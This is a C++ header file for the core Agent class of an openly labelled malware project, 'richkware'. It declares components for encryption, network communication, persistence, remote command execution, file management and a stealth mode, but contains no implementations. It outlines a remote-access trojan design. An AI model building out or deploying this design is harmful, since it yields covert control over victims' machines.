#pragma once

#include "types.hpp"
#include "../crypto/cipher.hpp"
#include "../network/client.hpp"
#include "../system/persistence.hpp"
#include "../modules/command_executor.hpp"
#include "../modules/file_manager.hpp"

#include <memory>
#include <atomic>
#include <thread>

namespace richkware::core {

/**
 * @brief Main agent class that coordinates all malware functionality
 */
class Agent {
public:
    /**
     * @brief Construct agent with configuration
     * @param config Agent configuration
     */
    explicit Agent(Config config);
    
    /**
     * @brief Destructor ensures clean shutdown
     */
    ~Agent();
    
    // Non-copyable, movable
    Agent(const Agent&) = delete;
    Agent& operator=(const Agent&) = delete;
    Agent(Agent&&) = default;
    Agent& operator=(Agent&&) = default;
    
    /**
     * @brief Initialize agent components
     * @return Result indicating success or failure
     */
    [[nodiscard]] Result<void> initialize();
    
    /**
     * @brief Start agent operations
     * @return Result indicating success or failure
     */
    [[nodiscard]] Result<void> start();
    
    /**
     * @brief Stop agent operations gracefully
     */
    void stop();
    
    /**
     * @brief Check if agent is running
     * @return true if running, false otherwise
     */
    [[nodiscard]] bool is_running() const noexcept;
    
    /**
     * @brief Get agent configuration
     * @return const reference to configuration
     */
    [[nodiscard]] const Config& config() const noexcept { return config_; }
    
    /**
     * @brief Execute a command
     * @param command Command to execute
     * @return Result with command output or error
     */
    [[nodiscard]] Result<std::string> execute_command(const std::string& command);
    
    /**
     * @brief Enable stealth mode
     * @return Result indicating success or failure
     */
    [[nodiscard]] Result<void> enable_stealth();
    
    /**
     * @brief Disable stealth mode
     * @return Result indicating success or failure
     */
    [[nodiscard]] Result<void> disable_stealth();

private:
    Config config_;
    std::atomic<bool> running_{false};
    std::atomic<bool> stealth_enabled_{false};
    
    // Core components
    std::unique_ptr<crypto::CipherManager> crypto_manager_;
    std::unique_ptr<network::NetworkClient> network_client_;
    std::unique_ptr<system::PersistenceManager> persistence_manager_;
    std::unique_ptr<modules::CommandExecutor> command_executor_;
    std::unique_ptr<modules::FileManager> file_manager_;
};

} // namespace richkware::core